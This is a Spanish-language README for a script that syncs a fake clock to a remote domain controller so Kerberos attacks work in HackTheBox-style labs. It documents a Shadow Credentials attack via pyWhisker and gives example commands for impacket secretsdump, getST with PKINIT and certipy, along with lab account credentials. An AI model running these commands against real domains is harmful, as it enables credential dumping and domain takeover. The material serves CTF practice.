# 🕐 Faketime Sync

Script para sincronizar la hora virtual con un DC remoto **sin modificar la hora del sistema**.  
Diseñado para entornos con Kerberos donde el reloj local difiere del servidor (CTFs, HackTheBox, labs).

---

## 📦 Requisitos

```bash
sudo apt install faketime krb5-user nmap ldap-utils ntpdate
```

> También requiere [pyWhisker](https://github.com/ShutdownRepo/pywhisker) si usas `--shadow`.

---

## 📋 Uso general

```bash
./faketime_sync.sh <DC_IP> <DOMAIN> [USER] [PASSWORD] [OPCIÓN]
```

---

## ⚡ Comandos disponibles

### 🔹 Solo obtener la hora virtual

```bash
./faketime_sync.sh 10.129.35.21 logging.htb
```

Detecta la hora del DC y muestra cómo usarla manualmente.

```
[*] Hora virtual : 2026-04-22 07:51:51
[*] Hora real    : 2026-04-21 20:51:51

[+] Sincronización lista. Úsala así:
  faketime '2026-04-22 07:51:51' kinit user@LOGGING.HTB
  faketime '2026-04-22 07:51:51' python3 pywhisker.py ...
  KRB5_CONFIG=/tmp/krb5_faketime.conf faketime '2026-04-22 07:51:51' <cmd>
```

---

### 🔹 Mostrar solo la hora virtual (sin output extra)

```bash
./faketime_sync.sh 10.129.35.21 logging.htb --show-time
```

Devuelve únicamente la hora, ideal para encadenar con otros scripts:

```bash
DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)
faketime "$DC_TIME" kinit user@LOGGING.HTB
```

---

### 🔹 Obtener TGT automáticamente

```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --tgt
```

Obtiene un **Ticket Granting Ticket (TGT)** con la hora del DC sincronizada.  
Equivale a ejecutar manualmente:

```bash
faketime '2026-04-22 07:51:51' kinit svc_recovery@LOGGING.HTB
```

---

### 🔹 Shadow Credentials attack

```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --shadow 'msa_health$'
```

Ejecuta **pyWhisker** con la hora virtual para agregar shadow credentials al target.  
Busca `pywhisker.py` automáticamente dentro de `~/`.

---

### 🔹 Ejecutar comando personalizado

```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --exec 'klist'
```

Ejecuta cualquier comando bajo `faketime` con la hora del DC.

**Más ejemplos con `--exec`:**

```bash
# Ver tickets activos
--exec 'klist'

# secretsdump con Kerberos
--exec 'python3 /opt/impacket/examples/secretsdump.py -k -no-pass dc01.logging.htb'

# pyWhisker manual
--exec 'python3 ~/pywhisker/pywhisker.py \
    -d logging.htb -u svc_recovery -p "Em3rg3ncyPa\$\$2026" \
    --target "msa_health\$" --action list --dc-ip 10.129.35.21'

# getST con PKINIT
--exec 'python3 /opt/impacket/examples/getST.py \
    -spn cifs/dc01.logging.htb \
    -pfx-base64 $(cat cert.pfx.b64) \
    logging.htb/msa_health$'

# certipy
--exec 'certipy auth -pfx msa_health.pfx -dc-ip 10.129.35.21'
```

---

## 🗂️ Resumen de opciones

| Opción | Args extra | Requiere creds | Descripción |
|--------|------------|----------------|-------------|
| *(sin opción)* | — | No | Obtiene hora y muestra uso manual |
| `--show-time` | — | No | Imprime solo la hora virtual |
| `--tgt` | — | ✅ Sí | Solicita TGT con `kinit` |
| `--shadow <target>` | `<target>` | ✅ Sí | Shadow Credentials via pyWhisker |
| `--exec '<cmd>'` | `'<comando>'` | Opcional | Ejecuta cmd con `faketime` |

---

## 🔍 Métodos de detección de hora

El script prueba en orden hasta obtener la hora del DC:

| Prioridad | Método | Herramienta | Notas |
|-----------|--------|-------------|-------|
| 1° | SMB timestamp | `nmap --script smb2-time` | Más confiable en CTFs |
| 2° | NTP offset | `ntpdate -q` | Requiere UDP 123 abierto |
| 3° | LDAP currentTime | `ldapsearch` | Requiere credenciales |
| 4° | Fallback | `+7h` hardcodeado | Último recurso |

---

## 💡 Uso avanzado

```bash
# Exportar hora para usarla en otros comandos
DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)

# Usar la config Kerberos generada por el script
KRB5_CONFIG=/tmp/krb5_faketime.conf faketime "$DC_TIME" klist

# Encadenar con impacket
KRB5_CONFIG=/tmp/krb5_faketime.conf faketime "$DC_TIME" \
    python3 getST.py -spn cifs/dc01.logging.htb logging.htb/msa_health$

# Verificar sincronización antes de atacar
./faketime_sync.sh 10.129.35.21 logging.htb --show-time && echo "OK"
```

---

## 📁 Archivos generados

| Archivo | Descripción |
|---------|-------------|
| `/tmp/krb5_faketime.conf` | Configuración Kerberos del DC |
| `/tmp/krb5cc_*` | Ticket cache (generado por `kinit`) |
| `/tmp/.krb_pass_*` | Archivo temporal de contraseña (se elimina automáticamente) |

---

## ⚠️ Advertencia

> Este script está diseñado para uso en **entornos de laboratorio y CTFs** (HackTheBox, TryHackMe, etc.).  
> No lo uses contra sistemas sin autorización explícita.
